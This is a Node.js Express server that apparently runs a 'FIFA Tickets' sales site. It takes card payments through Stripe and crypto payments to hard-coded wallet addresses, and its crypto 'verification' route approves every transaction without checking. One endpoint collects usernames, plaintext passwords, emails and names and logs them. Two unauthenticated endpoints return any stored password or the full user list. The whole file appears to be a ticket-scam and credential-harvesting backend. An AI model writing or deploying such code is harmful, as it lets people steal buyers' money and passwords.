const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const Stripe = require('stripe');
const { Resend } = require('resend'); // Import Resend
require('dotenv').config();

// Initialize Resend instead of Nodemailer
const resend = new Resend(process.env.RESEND_API_KEY);

const stripe = Stripe(process.env.STRIPE_SECRET_KEY);

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());

// In-memory storage
const transactions = [];
const userCredentials = [];

// Crypto Config
const CRYPTO_ADDRESSES = {
    'USDT_TRC20': 'TJzKVimFzF7tGQUH1NemCrctiZPPWrRzj6',
    'SOL': 'BeCmckF5KDGCY3jxG2r8o8VqQy8JySyA94i9osB45sVd',
    'BTC': 'bc1qqnmz38llzghmaskhq6wy3n6hjk68gh570a27sw',
    'ETH': '0x7978f226bbce9f03cac5c6d32526291a776b7436',
    'USDT_ERC20': '0xf4f2db3ce0cf82594255ab301b77e0beec2e1a47'
};

const CRYPTO_NETWORKS = {
    'USDT_TRC20': 'TRC20 Network',
    'SOL': 'SOLANA Network',
    'BTC': 'Bitcoin Network',
    'ETH': 'Ethereum ERC20 Network',
    'USDT_ERC20': 'Ethereum ERC20 Network'
};

function generateTransactionId() {
    return 'FIFA-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9).toUpperCase();
}

function validateTransactionId(txnId, cryptoType) {
    // Simple validation to allow testing
    return txnId.length > 10;
}

// --- API ENDPOINTS ---

app.get('/', (req, res) => {
    res.json({ status: 'System Running', email_system: 'Resend API' });
});

app.get('/api/stripe-config', (req, res) => {
    res.json({ publishableKey: process.env.STRIPE_PUBLISHABLE_KEY });
});

app.get('/api/crypto-addresses', (req, res) => {
    res.json({
        success: true,
        addresses: CRYPTO_ADDRESSES,
        networks: CRYPTO_NETWORKS
    });
});

// ✅ RESTORED: Detailed Store Credentials Logic
app.post('/api/store-credentials', (req, res) => {
    try {
        const { username, password, email, name } = req.body;
        
        console.log('🔐 Storing credentials:', { username, password, email, name });
        
        // Check if user already exists
        const existingUserIndex = userCredentials.findIndex(user => user.username === username || user.email === email);
        
        if (existingUserIndex !== -1) {
            // Update existing user
            userCredentials[existingUserIndex] = {
                username,
                password, 
                email,
                name,
                timestamp: new Date().toISOString()
            };
        } else {
            // Add new user
            userCredentials.push({
                username,
                password, 
                email,
                name,
                timestamp: new Date().toISOString()
            });
        }
        
        console.log('✅ Credentials stored successfully');
        
        res.json({
            success: true,
            message: 'Credentials stored successfully'
        });
        
    } catch (error) {
        console.error('❌ Error storing credentials:', error);
        res.json({
            success: false,
            message: error.message
        });
    }
});

// ✅ RESTORED: Get Password Endpoint
app.get('/api/get-password/:username', (req, res) => {
    try {
        const { username } = req.params;
        const user = userCredentials.find(u => u.username === username);
        
        if (user) {
            res.json({
                success: true,
                username: user.username,
                password: user.password, 
                email: user.email,
                name: user.name,
                timestamp: user.timestamp
            });
        } else {
            res.status(404).json({ success: false, message: 'User not found' });
        }
    } catch (error) {
        console.error('❌ Error retrieving password:', error);
        res.json({ success: false, message: error.message });
    }
});

// ✅ RESTORED: Get All Users Endpoint
app.get('/api/all-users', (req, res) => {
    try {
        res.json({
            success: true,
            count: userCredentials.length,
            users: userCredentials
        });
    } catch (error) {
        console.error('❌ Error retrieving users:', error);
        res.json({ success: false, message: error.message });
    }
});

app.post('/api/process-payment', async (req, res) => {
    try {
        const { total, currency = 'USD', customer, tickets } = req.body;
        
        const paymentIntent = await stripe.paymentIntents.create({
            amount: Math.round(total * 100),
            currency: currency.toLowerCase(),
            description: `FIFA Tickets (${tickets.length})`,
            receipt_email: customer.email
        });

        res.json({
            success: true,
            clientSecret: paymentIntent.client_secret
        });
    } catch (error) {
        res.json({ success: false, message: error.message });
    }
});

app.post('/api/verify-crypto', async (req, res) => {
    // Simulate successful verification for demo
    const { transactionId, cryptoType } = req.body;
    res.json({
        success: true,
        verified: true,
        transactionId: transactionId,
        message: 'Verified'
    });
});

// ✅ NEW EMAIL SENDING FUNCTION (Using Resend)
app.post('/api/send-confirmation', async (req, res) => {
    try {
        const { customer, tickets, payment, transactionId } = req.body;
        
        console.log('📧 Sending email via Resend to:', customer.email);

        // 1. Generate HTML
        const emailHtml = generateTicketEmail(customer, tickets, payment, transactionId, payment.method);

        // 2. Send via API (This works on Render!)
        const { data, error } = await resend.emails.send({
            from: 'FIFA Tickets <onboarding@resend.dev>', // Default testing email
            to: [customer.email], // In Resend free tier, this must be YOUR email until you verify a domain
            subject: `Ticket Confirmation #${transactionId}`,
            html: emailHtml
        });

        if (error) {
            console.error('❌ Resend Error:', error);
            // Don't fail the request, just log it
        } else {
            console.log('✅ Email sent:', data);
        }

        res.json({ success: true, message: 'Confirmation sent' });

    } catch (error) {
        console.error('Server Error:', error);
        res.json({ success: true, message: 'Processed (Email skipped due to error)' });
    }
});

// HTML Generator
function generateTicketEmail(customer, tickets, payment, transactionId, paymentMethod) {
    const ticketList = tickets.map(t => {
        // Fix: Calculate quantity logic (defaults to 1 if undefined)
        const qty = t.quantity || 1;
        const price = t.price || 0;
        const total = price * qty;
        
        return `<div style="border:1px solid #ccc; padding:10px; margin:10px 0;">
            <strong>${t.match.teams}</strong><br>
            ${t.match.venue}<br>
            ${t.category.name}<br>
            Quantity: ${qty} <br>
            Price: USD ${total.toLocaleString()}
         </div>`;
    }).join('');

    return `
        <h1>Ticket Confirmation</h1>
        <p>Dear ${customer.name},</p>
        <p>Your payment was successful!</p>
        <h3>Your Tickets:</h3>
        ${ticketList}
        <p><strong>Transaction ID:</strong> ${transactionId}</p>
        <p><strong>Total Paid:</strong> USD ${payment.amount ? payment.amount.toLocaleString() : 'Paid'}</p>
    `;
}

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
